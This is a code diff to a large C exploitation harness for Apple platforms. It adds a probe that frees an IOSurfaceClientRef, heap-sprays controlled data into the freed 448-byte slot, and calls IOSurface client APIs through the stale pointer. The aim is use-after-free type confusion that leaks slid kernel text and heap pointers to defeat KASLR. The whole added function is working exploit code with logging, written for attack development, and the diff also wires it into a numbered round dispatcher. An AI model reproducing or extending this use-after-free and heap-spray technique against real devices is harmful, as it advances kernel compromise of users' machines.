@@ -15901,6 +15901,283 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r363: IOSurfaceClientRef UAF layout dump + type confusion KASLR leak.
+ * 1. Create IOSurfaceClientRef, dump its raw memory to identify fields
+ * 2. Free client, spray controlled data into the 448-byte slot
+ * 3. Through the stale pointer, call CopyAllValues → kernel interprets sprayed
+ *    data as a client struct, may access wrong driver/surface/connection
+ * 4. If type confusion leaks kernel data, extract text pointers
+ */
+static void r363_probe(void) {
+    rlog("\n=== r363: IOSurfaceClientRef UAF Type Confusion ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    typedef CFDictionaryRef (*clientCopyAllValues_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+    clientCopyAllValues_t clCopyAll = (clientCopyAllValues_t)dlsym(iosurfH, "IOSurfaceClientCopyAllValues");
+
+    if (!clLookup || !clRelease || !clSetValue || !clCopyValue) {
+        rlog("  FATAL: missing IOSurface client APIs\n");
+        if (iosurfH) dlclose(iosurfH);
+        return;
+    }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys363[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals363[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef props = CFDictionaryCreate(NULL,
+        (const void**)keys363, (const void**)vals363, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Part 1: IOSurfaceClientRef layout analysis ---- */
+    rlog("--- Part 1: Client ref layout dump ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef surf_a = IOSurfaceCreate(props);
+    if (!surf_a) { rlog("  FATAL: IOSurfaceCreate failed\n"); goto r363_cleanup; }
+    uint32_t sid_a = IOSurfaceGetID(surf_a);
+    rlog("  Surface A: ID=%u\n", sid_a);
+
+    IOSurfaceClientRef client_a = clLookup(sid_a);
+    if (!client_a) { rlog("  FATAL: ClientLookup failed\n"); CFRelease(surf_a); goto r363_cleanup; }
+
+    /* Dump the client ref's raw memory */
+    uint8_t *client_bytes = (uint8_t*)client_a;
+    rlog("  ClientRef at %p\n", client_a);
+
+    /* Find interesting fields: look for surface ID and mach port values */
+    int sid_offsets[8]; int n_sid = 0;
+    int conn_offsets[8]; int n_conn = 0;
+
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t v32;
+        memcpy(&v32, client_bytes + off, 4);
+        if (v32 == sid_a && n_sid < 8) sid_offsets[n_sid++] = off;
+        /* Mach ports are typically small positive integers > 0x100 */
+        if (v32 >= 0x100 && v32 < 0x10000 && (v32 & 3) == 3 && n_conn < 8)
+            conn_offsets[n_conn++] = off;
+    }
+
+    rlog("  Surface ID (%u) found at %d offsets:", sid_a, n_sid);
+    for (int i = 0; i < n_sid; i++) rlog(" +%d", sid_offsets[i]);
+    rlog("\n");
+
+    rlog("  Mach port candidates found at %d offsets:", n_conn);
+    for (int i = 0; i < n_conn; i++) {
+        uint32_t v; memcpy(&v, client_bytes + conn_offsets[i], 4);
+        rlog(" +%d(0x%x)", conn_offsets[i], v);
+    }
+    rlog("\n");
+
+    /* Dump first 128 bytes as hex for analysis */
+    rlog("  Raw dump (first 128 bytes):\n");
+    for (int row = 0; row < 128; row += 32) {
+        rlog("    +%03d: ", row);
+        for (int col = 0; col < 32; col += 8) {
+            uint64_t v; memcpy(&v, client_bytes + row + col, 8);
+            rlog("%016llx ", (unsigned long long)v);
+        }
+        rlog("\n");
+    }
+    rlog("  Raw dump (bytes 128-256):\n");
+    for (int row = 128; row < 256; row += 32) {
+        rlog("    +%03d: ", row);
+        for (int col = 0; col < 32; col += 8) {
+            uint64_t v; memcpy(&v, client_bytes + row + col, 8);
+            rlog("%016llx ", (unsigned long long)v);
+        }
+        rlog("\n");
+    }
+
+    /* Check for kernel-range pointers in the client ref */
+    rlog("  Kernel-range values in client:\n");
+    int client_kptrs = 0;
+    for (int off = 0; off < 448; off += 8) {
+        uint64_t v; memcpy(&v, client_bytes + off, 8);
+        if (v >= 0xFFFFFFF000000000ULL && v < 0xFFFFFFFF00000000ULL) {
+            rlog("    +%d: 0x%llx", off, (unsigned long long)v);
+            if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL)
+                rlog(" *** SLID TEXT ***");
+            rlog("\n");
+            client_kptrs++;
+        }
+    }
+    if (client_kptrs == 0) rlog("    (none)\n");
+
+    /* ---- Part 2: UAF + heap spray ---- */
+    rlog("\n--- Part 2: UAF + heap spray type confusion ---\n");
+    fflush(stdout);
+
+    /* Save the stale pointer and key data before freeing */
+    uint8_t saved_client[448];
+    memcpy(saved_client, client_bytes, 448);
+
+    /* Set a marker property so we can detect cross-reads */
+    CFStringRef marker_key = CFStringCreateWithCString(NULL, "r363_marker", kCFStringEncodingASCII);
+    int marker_val = 0xDEAD363;
+    CFNumberRef marker_num = CFNumberCreate(NULL, kCFNumberIntType, &marker_val);
+    clSetValue(client_a, marker_key, marker_num);
+
+    /* Free the client ref */
+    clRelease(client_a);
+    rlog("  Freed client_a at %p\n", client_a);
+
+    /* Spray 448-byte allocations to fill the freed slot */
+    /* Use CFData objects of exactly 448 bytes */
+    #define R363_SPRAY 256
+    CFMutableDataRef spray_datas[R363_SPRAY];
+    int spray_hit = 0;
+
+    /* Prepare spray payload: copy original client data but modify surface ID */
+    IOSurfaceRef surf_b = IOSurfaceCreate(props);
+    uint32_t sid_b = surf_b ? IOSurfaceGetID(surf_b) : 0;
+    rlog("  Surface B: ID=%u\n", sid_b);
+
+    for (int i = 0; i < R363_SPRAY; i++) {
+        spray_datas[i] = CFDataCreateMutable(NULL, 448);
+        CFDataSetLength(spray_datas[i], 448);
+        uint8_t *sp = CFDataGetMutableBytePtr(spray_datas[i]);
+        memcpy(sp, saved_client, 448);
+        /* Overwrite surface ID fields to point to surf_b */
+        for (int s = 0; s < n_sid; s++) {
+            memcpy(sp + sid_offsets[s], &sid_b, 4);
+        }
+    }
+
+    /* Now try to CopyValue through the stale pointer */
+    /* The stale pointer's memory should now contain one of our sprayed payloads */
+    rlog("  Attempting CopyValue through stale pointer...\n");
+    fflush(stdout);
+
+    CFTypeRef read_val = clCopyValue((IOSurfaceClientRef)client_a, marker_key);
+    if (read_val) {
+        rlog("  *** CopyValue RETURNED data through stale pointer! ***\n");
+        CFTypeID tid = CFGetTypeID(read_val);
+        if (tid == CFNumberGetTypeID()) {
+            int rv = 0;
+            CFNumberGetValue((CFNumberRef)read_val, kCFNumberIntType, &rv);
+            rlog("  Value: 0x%x (expected 0xDEAD363)\n", rv);
+            if (rv == 0xDEAD363)
+                rlog("  Cross-read to surface B confirmed!\n");
+        } else if (tid == CFDataGetTypeID()) {
+            CFDataRef d = (CFDataRef)read_val;
+            CFIndex len = CFDataGetLength(d);
+            rlog("  Got CFData, len=%d\n", (int)len);
+            const uint8_t *db = CFDataGetBytePtr(d);
+            /* Scan for kernel pointers */
+            for (CFIndex j = 0; j + 7 < len; j += 8) {
+                uint64_t v; memcpy(&v, db + j, 8);
+                if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                    rlog("  *** SLID TEXT in returned data: off=%d val=0x%llx ***\n",
+                        (int)j, (unsigned long long)v);
+                }
+                if (v >= 0xFFFFFFFE00000000ULL && v < 0xFFFFFFFF00000000ULL) {
+                    rlog("  HEAP PTR in returned data: off=%d val=0x%llx\n",
+                        (int)j, (unsigned long long)v);
+                }
+            }
+        } else {
+            rlog("  Got type %lu\n", (unsigned long)tid);
+        }
+        CFRelease(read_val);
+    } else {
+        rlog("  CopyValue returned NULL (stale pointer's slot may not be reused yet)\n");
+
+        /* Try re-reading the stale pointer's memory to see what landed there */
+        rlog("  Stale pointer memory now:\n");
+        for (int row = 0; row < 64; row += 32) {
+            rlog("    +%03d: ", row);
+            for (int col = 0; col < 32; col += 8) {
+                uint64_t v; memcpy(&v, client_bytes + row + col, 8);
+                rlog("%016llx ", (unsigned long long)v);
+            }
+            rlog("\n");
+        }
+    }
+
+    /* Try CopyAllValues too */
+    if (clCopyAll) {
+        rlog("  Attempting CopyAllValues through stale pointer...\n");
+        CFDictionaryRef all = clCopyAll((IOSurfaceClientRef)client_a);
+        if (all) {
+            CFIndex cnt = CFDictionaryGetCount(all);
+            rlog("  *** CopyAllValues returned dict with %d entries! ***\n", (int)cnt);
+            /* Dump all keys+values looking for kernel data */
+            if (cnt > 0 && cnt < 100) {
+                const void **ak = (const void**)malloc(sizeof(void*) * (size_t)cnt);
+                const void **av = (const void**)malloc(sizeof(void*) * (size_t)cnt);
+                CFDictionaryGetKeysAndValues(all, ak, av);
+                for (CFIndex i = 0; i < cnt; i++) {
+                    if (CFGetTypeID(av[i]) == CFNumberGetTypeID()) {
+                        int64_t nv = 0;
+                        CFNumberGetValue((CFNumberRef)av[i], kCFNumberSInt64Type, &nv);
+                        uint64_t uv = (uint64_t)nv;
+                        if (uv >= 0xFFFFFFF000000000ULL && uv < 0xFFFFFFFF00000000ULL) {
+                            char kb[128] = {0};
+                            if (CFGetTypeID(ak[i]) == CFStringGetTypeID())
+                                CFStringGetCString((CFStringRef)ak[i], kb, 128, kCFStringEncodingASCII);
+                            rlog("  *** KPTR in dict: %s = 0x%llx ***\n", kb, (unsigned long long)uv);
+                        }
+                    }
+                    if (CFGetTypeID(av[i]) == CFDataGetTypeID()) {
+                        CFDataRef d = (CFDataRef)av[i];
+                        const uint8_t *db = CFDataGetBytePtr(d);
+                        CFIndex dl = CFDataGetLength(d);
+                        for (CFIndex j = 0; j + 7 < dl; j += 8) {
+                            uint64_t v; memcpy(&v, db + j, 8);
+                            if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                                rlog("  *** SLID TEXT in dict data: 0x%llx ***\n", (unsigned long long)v);
+                            }
+                        }
+                    }
+                }
+                free(ak); free(av);
+            }
+            CFRelease(all);
+        } else {
+            rlog("  CopyAllValues returned NULL\n");
+        }
+    }
+
+    /* Cleanup spray */
+    for (int i = 0; i < R363_SPRAY; i++) {
+        if (spray_datas[i]) CFRelease(spray_datas[i]);
+    }
+    if (surf_b) CFRelease(surf_b);
+    CFRelease(surf_a);
+    CFRelease(marker_key);
+    CFRelease(marker_num);
+
+r363_cleanup:
+    CFRelease(props);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+    if (iosurfH) dlclose(iosurfH);
+    rlog("\n=== r363 complete ===\n");
+    fflush(stdout);
+}
+
 /* r361: IOSurface-backed Metal texture KASLR leak
  * Theory: creating textures from IOSurfaces forces the GPU driver to store
  * IOSurface kext object pointers (including vtable addresses in slid kernel
@@ -54263,6 +54540,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 366) {
+            rlog("*** rounds=366: IOSurfaceClientRef UAF Type Confusion ***\n");
+            rlog("  Dump client layout, UAF + spray, type-confused CopyValue\n\n");
+            fflush(stdout);
+            r363_probe();
+            goto done;
+        }
         if (rounds == 365) {
             rlog("*** rounds=365: Deep IORegistry + IOKit User Client Scan ***\n");
             rlog("  Walking entire IORegistry tree + scanning user client outputs\n");
@@ -56395,7 +56679,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -66237,7 +66521,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
